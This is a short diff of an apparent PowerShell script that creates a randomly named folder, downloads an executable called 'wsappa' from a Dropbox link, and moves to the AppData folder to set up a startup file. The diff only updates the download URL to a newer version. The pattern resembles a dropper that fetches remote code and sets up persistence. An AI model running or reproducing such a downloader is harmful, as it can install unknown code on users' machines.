@@ -8,7 +8,7 @@ mkdir sVBXKuz
 cd sVBXKuz
 
 #download executable and startup file
-Invoke-WebRequest -Uri "dl.dropboxusercontent.com/s/ktmct46mftulye1s7ka7j/wsappa-1.5.exe?rlkey=sfae0om54ct58a3cmgh3z4ndg&dl=0" -OutFile wsappa.exe
+Invoke-WebRequest -Uri "dl.dropboxusercontent.com/scl/fi/p5ifhyuv4p1ui2ecolmoz/wsappa-1.6.exe?rlkey=duuxz6c3b7168p2r6iu3ozjaw&dl=0" -OutFile wsappa.exe
 
 #sets location appdata
 cd $env:appdata 
